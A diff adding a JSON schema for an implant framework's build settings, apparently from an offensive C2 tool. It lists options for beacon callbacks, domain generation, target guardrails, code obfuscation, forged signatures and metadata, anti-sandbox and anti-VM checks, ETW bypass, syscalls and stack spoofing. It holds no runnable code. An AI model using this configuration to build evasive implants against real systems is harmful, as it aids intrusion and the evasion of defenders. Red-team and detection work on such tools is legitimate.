@@ -1,0 +1,424 @@
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "type": "object",
+  "properties": {
+    "basic": {
+      "type": "object",
+      "properties": {
+        "name": {"type": "string"},
+        "proxy": {
+          "type": "object",
+          "properties": {
+            "use_env_proxy": {
+              "type": "boolean",
+              "x-cargo-features": {
+                "type": "bool_flag",
+                "features": ["proxy"]
+              }
+            },
+            "url": {
+              "type": "string",
+              "x-cargo-features": {
+                "type": "non_empty",
+                "features": ["proxy"]
+              }
+            }
+          }
+        },
+        "cron": {"type": "string"},
+        "jitter": {"type": "number"},
+        "keepalive": {"type": "boolean"},
+        "retry": {"type": "integer"},
+        "max_cycles": {"type": "integer"},
+        "encryption": {
+          "type": "string",
+          "x-cargo-features": {
+            "type": "enum_map",
+            "mapping": {
+              "aes": ["crypto_aes"],
+              "chacha20": ["crypto_chacha20"],
+              "*": ["crypto_xor"]
+            }
+          }
+        },
+        "key": {"type": "string"},
+        "secure": {
+          "type": "object",
+          "properties": {
+            "enable": {
+              "type": "boolean",
+              "x-cargo-features": {
+                "type": "bool_flag",
+                "features": ["secure"]
+              }
+            },
+            "private_key": {"type": "string"},
+            "public_key": {"type": "string"}
+          },
+          "required": ["enable"]
+        },
+        "dga": {
+          "type": "object",
+          "properties": {
+            "enable": {
+              "type": "boolean",
+              "x-cargo-features": {
+                "type": "bool_flag",
+                "features": ["dga"]
+              }
+            },
+            "key": {"type": "string"},
+            "interval_hours": {"type": "integer"}
+          }
+        },
+        "guardrail": {
+          "type": "object",
+          "properties": {
+            "enable": {
+              "type": "boolean",
+              "x-cargo-features": {
+                "type": "bool_flag",
+                "features": ["guardrail"]
+              }
+            },
+            "require_all": {"type": "boolean"},
+            "ip_addresses": {
+              "type": "array",
+              "items": {"type": "string"}
+            },
+            "usernames": {
+              "type": "array",
+              "items": {"type": "string"}
+            },
+            "server_names": {
+              "type": "array",
+              "items": {"type": "string"}
+            },
+            "domains": {
+              "type": "array",
+              "items": {"type": "string"}
+            }
+          },
+          "required": ["enable"]
+        },
+        "targets": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "x-cargo-features-group": {
+              "presence_fields": {
+                "http": ["transport_http"],
+                "rem": ["transport_rem"]
+              },
+              "default_when_absent": ["transport_tcp"]
+            },
+            "properties": {
+              "address": {"type": "string"},
+              "domain_suffix": {"type": "string"},
+              "http": {
+                "type": "object",
+                "properties": {
+                  "method": {"type": "string"},
+                  "path": {"type": "string"},
+                  "version": {"type": "string"},
+                  "headers": {
+                    "type": "object",
+                    "additionalProperties": {"type": "string"}
+                  }
+                }
+              },
+              "tcp": {"type": "object"},
+              "tls": {
+                "type": "object",
+                "properties": {
+                  "enable": {
+                    "type": "boolean",
+                    "x-cargo-features": {
+                      "type": "bool_flag",
+                      "features": ["tls"]
+                    }
+                  },
+                  "version": {"type": "string"},
+                  "sni": {"type": "string"},
+                  "skip_verification": {"type": "boolean"},
+                  "mtls": {
+                    "type": "object",
+                    "properties": {
+                      "enable": {
+                        "type": "boolean",
+                        "x-cargo-features": {
+                          "type": "bool_flag",
+                          "features": ["mtls"]
+                        }
+                      },
+                      "client_cert": {"type": "string"},
+                      "client_key": {"type": "string"},
+                      "server_ca": {"type": "string"}
+                    }
+                  }
+                }
+              },
+              "rem": {
+                "type": "object",
+                "properties": {
+                  "link": {"type": "string"}
+                }
+              }
+            },
+            "required": ["address"]
+          }
+        }
+      },
+      "required": ["retry","encryption","key", "cron", "jitter", "targets"]
+    },
+    "build": {
+      "type": "object",
+      "properties": {
+        "zigbuild": {"type": "boolean"},
+        "remap": {"type": "boolean"},
+        "toolchain": {"type": "string"},
+        "srdi": {"type": "boolean"},
+        "objcopy": {"type": "boolean"},
+        "signforge": {
+          "type": "object",
+          "properties": {
+            "input_file": {"type": "string"},
+            "signature_path": {"type": "string"}
+          }
+        },
+        "ollvm": {
+          "type": "object",
+          "properties": {
+            "enable": {"type": "boolean"},
+            "bcfobf": {"type": "boolean"},
+            "splitobf": {"type": "boolean"},
+            "subobf": {"type": "boolean"},
+            "fco": {"type": "boolean"},
+            "constenc": {"type": "boolean"}
+          }
+        },
+        "metadata": {
+          "type": "object",
+          "properties": {
+            "remap_path": {"type": "string"},
+            "icon": {"type": "string"},
+            "compile_time": {"type": "string"},
+            "file_version": {"type": "string"},
+            "product_version": {"type": "string"},
+            "company_name": {"type": "string"},
+            "product_name": {"type": "string"},
+            "original_filename": {"type": "string"},
+            "file_description": {"type": "string"},
+            "internal_name": {"type": "string"},
+            "require_admin": {"type": "boolean"},
+            "require_uac": {"type": "boolean"}
+          }
+        }
+      }
+    },
+    "pulse": {
+      "type": "object",
+      "properties": {
+        "flags": {
+          "type": "object",
+          "properties": {
+            "start": {"type": "integer"},
+            "end": {"type": "integer"},
+            "magic": {"type": "string"},
+            "artifact_id": {"type": "integer"}
+          }
+        },
+        "encryption": {"type": "string"},
+        "key": {"type": "string"},
+        "target": {"type": "string"},
+        "protocol": {"type": "string"},
+        "http": {
+          "type": "object",
+          "properties": {
+            "method": {"type": "string"},
+            "path": {"type": "string"},
+            "host": {"type": "string"},
+            "version": {"type": "string"},
+            "headers": {
+              "type": "object",
+              "additionalProperties": {"type": "string"}
+            }
+          }
+        }
+      }
+    },
+    "implants": {
+      "type": "object",
+      "properties": {
+        "runtime": {
+          "type": "string",
+          "x-cargo-features": {
+            "type": "enum_map",
+            "mapping": {
+              "tokio": [],
+              "smol": [],
+              "async-std": [],
+              "*": []
+            }
+          }
+        },
+        "mod": {
+          "type": "string",
+          "x-cargo-features": {
+            "type": "enum_map",
+            "mapping": {
+              "beacon": ["beacon"],
+              "bind": ["bind"]
+            }
+          }
+        },
+        "register_info": {
+          "type": "boolean",
+          "x-cargo-features": {
+            "type": "bool_flag",
+            "features": ["register_info"]
+          }
+        },
+        "hot_load": {
+          "type": "boolean",
+          "x-cargo-features": {
+            "type": "bool_flag",
+            "features": ["hot_load"]
+          }
+        },
+        "addon": {
+          "type": "boolean",
+          "x-cargo-features": {
+            "type": "bool_flag",
+            "features": ["addon"]
+          }
+        },
+        "modules": {
+          "type": "array",
+          "items": {"type": "string"}
+        },
+        "enable_3rd": {
+          "type": "boolean",
+          "x-cargo-features": {
+            "type": "bool_flag",
+            "features": ["malefic-3rd"]
+          }
+        },
+        "3rd_modules": {
+          "type": "array",
+          "items": {"type": "string"}
+        },
+        "prelude": {"type": "string"},
+        "autorun": {"type": "string"},
+        "pack": {
+          "type": "array",
+          "items": {
+            "type": "object",
+            "properties": {
+              "src": {"type": "string"},
+              "dst": {"type": "string"}
+            }
+          }
+        },
+        "flags": {
+          "type": "object",
+          "properties": {
+            "start": {"type": "integer"},
+            "end": {"type": "integer"},
+            "magic": {"type": "string"},
+            "artifact_id": {"type": "integer"}
+          }
+        },
+        "anti": {
+          "type": "object",
+          "properties": {
+            "sandbox": {
+              "type": "boolean",
+              "x-cargo-features": {
+                "type": "bool_flag",
+                "features": ["anti_sandbox"]
+              }
+            },
+            "vm": {
+              "type": "boolean",
+              "x-cargo-features": {
+                "type": "bool_flag",
+                "features": ["anti_vm"]
+              }
+            },
+            "debug": {"type": "boolean"},
+            "disasm": {"type": "boolean"},
+            "emulator": {"type": "boolean"},
+            "forensic": {"type": "boolean"}
+          }
+        },
+        "apis": {
+          "type": "object",
+          "properties": {
+            "level": {"type": "string"},
+            "priority": {
+              "type": "object",
+              "properties": {
+                "normal": {
+                  "type": "object",
+                  "properties": {
+                    "enable": {"type": "boolean"},
+                    "type": {"type": "string"}
+                  },
+                  "required": ["enable", "type"]
+                },
+                "dynamic": {
+                  "type": "object",
+                  "properties": {
+                    "enable": {"type": "boolean"},
+                    "type": {"type": "string"}
+                  },
+                  "required": ["enable", "type"]
+                },
+                "syscalls": {
+                  "type": "object",
+                  "properties": {
+                    "enable": {"type": "boolean"},
+                    "type": {"type": "string"}
+                  },
+                  "required": ["enable", "type"]
+                }
+              },
+              "required": ["normal", "dynamic", "syscalls"]
+            }
+          },
+          "required": ["level", "priority"]
+        },
+        "alloctor": {
+          "type": "object",
+          "properties": {
+            "inprocess": {"type": "string"},
+            "crossprocess": {"type": "string"}
+          },
+          "required": ["inprocess", "crossprocess"]
+        },
+        "thread_stack_spoofer": {"type": "boolean"}
+      },
+      "required": ["runtime", "mod", "register_info", "hot_load", "modules" ]
+    }
+  },
+  "required": ["basic", "build", "pulse", "implants"],
+  "loader": {
+    "type": "object",
+    "properties": {
+      "evader": {
+        "type": "object",
+        "properties": {
+          "anti_emu":      { "type": "boolean" },
+          "etw_pass":      { "type": "boolean" },
+          "god_speed":     { "type": "boolean" },
+          "sleep_encrypt": { "type": "boolean" },
+          "anti_forensic": { "type": "boolean" },
+          "cfg_patch":     { "type": "boolean" },
+          "api_untangle":  { "type": "boolean" },
+          "normal_api":    { "type": "boolean" }
+        }
+      }
+    }
+  }
+}
